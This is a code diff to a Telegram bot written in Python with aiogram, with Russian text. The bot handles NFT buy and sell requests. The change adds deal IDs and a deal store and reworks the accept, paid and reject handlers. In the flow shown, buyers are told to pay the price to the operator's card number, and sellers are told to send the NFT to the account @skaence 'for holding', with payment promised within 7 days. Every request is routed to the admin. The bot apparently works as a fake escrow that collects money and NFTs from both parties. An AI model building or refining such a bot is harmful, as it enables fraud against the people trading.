@@ -1,6 +1,7 @@
 import asyncio
 import logging
 import os
+import uuid
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
@@ -27,6 +28,9 @@ dp = Dispatcher(storage=storage)
 # username (lower) → user_id
 registered_users = {}
 
+# Временное хранилище заявок
+deals = {}
+
 
 class Form(StatesGroup):
     role = State()
@@ -44,13 +48,11 @@ async def start(message: Message, state: FSMContext):
     if message.from_user.username:
         registered_users[message.from_user.username.lower()] = message.from_user.id
 
-    # Постоянная кнопка Техподдержка
     reply_kb = ReplyKeyboardMarkup(
         keyboard=[[KeyboardButton(text="Техподдержка")]],
         resize_keyboard=True
     )
 
-    # Кнопки выбора
     inline_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🛒 Продать NFT", callback_data="role_sell")],
         [InlineKeyboardButton(text="💰 Купить NFT", callback_data="role_buy")]
@@ -154,6 +156,27 @@ async def confirm_yes(callback: CallbackQuery, state: FSMContext):
     role_text = "продажу" if role == "sell" else "покупку"
     other_username_clean = data["other_username"].lstrip("@").lower()
 
+    # Создаём ID заявки
+    deal_id = str(uuid.uuid4())[:8]
+
+    # Определяем, кто продавец
+    if role == "sell":
+        seller_id = user.id
+        buyer_username = data["other_username"]
+    else:
+        seller_id = registered_users.get(other_username_clean)
+        buyer_username = data["my_username"]
+
+    deals[deal_id] = {
+        "role": role,
+        "sender_id": user.id,
+        "seller_id": seller_id,
+        "price": data["price"],
+        "nft_name": data["nft_name"],
+        "my_username": data["my_username"],
+        "other_username": data["other_username"]
+    }
+
     deal_text = (
         f"<b>Новая заявка на {role_text} NFT</b>\n\n"
         f"От: {user.full_name} (@{user.username or 'нет'})\n"
@@ -166,15 +189,13 @@ async def confirm_yes(callback: CallbackQuery, state: FSMContext):
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="✅ Согласиться", callback_data=f"accept:{user.id}:{role}"),
-            InlineKeyboardButton(text="❌ Отказаться", callback_data=f"reject:{user.id}")
+            InlineKeyboardButton(text="✅ Согласиться", callback_data=f"accept:{deal_id}"),
+            InlineKeyboardButton(text="❌ Отказаться", callback_data=f"reject:{deal_id}")
         ]
     ])
 
-    # Всегда отправляем тебе
     await bot.send_message(ADMIN_ID, deal_text, reply_markup=kb, parse_mode="HTML")
 
-    # Отправляем второй стороне
     other_id = registered_users.get(other_username_clean)
     status = ["Заявка отправлена."]
 
@@ -207,19 +228,26 @@ async def confirm_no(callback: CallbackQuery, state: FSMContext):
 
 @dp.callback_query(F.data.startswith("accept:"))
 async def accept_deal(callback: CallbackQuery):
-    parts = callback.data.split(":")
-    sender_id = int(parts[1])
+    deal_id = callback.data.split(":")[1]
+    deal = deals.get(deal_id)
+
+    if not deal:
+        await callback.answer("Заявка устарела", show_alert=True)
+        return
+
+    sender_id = deal["sender_id"]
+    price = deal["price"]
 
     payment_text = (
         f"<b>Заявка принята!</b>\n\n"
-        f"Для оплаты переведите сумму на карту:\n\n"
+        f"Для оплаты переведите <b>{price}</b> на карту:\n\n"
         f"<code>{CARD_NUMBER}</code>\n\n"
         f"⚠️ Деньги будут на удержании и будут отправлены только в течение 7 дней.\n\n"
         f"После перевода нажмите кнопку ниже."
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Я отправил деньги", callback_data=f"paid:{sender_id}")]
+        [InlineKeyboardButton(text="✅ Я отправил деньги", callback_data=f"paid:{deal_id}")]
     ])
 
     await bot.send_message(sender_id, payment_text, reply_markup=kb, parse_mode="HTML")
@@ -233,15 +261,29 @@ async def accept_deal(callback: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("paid:"))
 async def user_paid(callback: CallbackQuery):
-    sender_id = int(callback.data.split(":")[1])
+    deal_id = callback.data.split(":")[1]
+    deal = deals.get(deal_id)
 
-    await bot.send_message(
-        sender_id,
-        "Покупатель оплатил заказ.\n\n"
-        "Отправьте NFT на @skaence на удержание.\n\n"
-        "В течение 7 дней вы получите деньги."
-    )
+    if not deal:
+        await callback.answer("Заявка устарела", show_alert=True)
+        return
 
+    seller_id = deal.get("seller_id")
+    sender_id = deal["sender_id"]
+
+    # Сообщение ПРОДАВЦУ
+    if seller_id:
+        try:
+            await bot.send_message(
+                seller_id,
+                "Покупатель оплатил заказ.\n\n"
+                "Отправьте NFT на @skaence на удержание.\n\n"
+                "В течение 7 дней вы получите деньги."
+            )
+        except Exception:
+            pass
+
+    # Уведомление тебе
     await bot.send_message(
         ADMIN_ID,
         f"Пользователь (ID: <code>{sender_id}</code>) нажал «Я отправил деньги».\n"
@@ -258,7 +300,14 @@ async def user_paid(callback: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("reject:"))
 async def reject_deal(callback: CallbackQuery):
-    sender_id = int(callback.data.split(":")[1])
+    deal_id = callback.data.split(":")[1]
+    deal = deals.get(deal_id)
+
+    if not deal:
+        await callback.answer("Заявка устарела", show_alert=True)
+        return
+
+    sender_id = deal["sender_id"]
 
     await bot.send_message(
         sender_id,
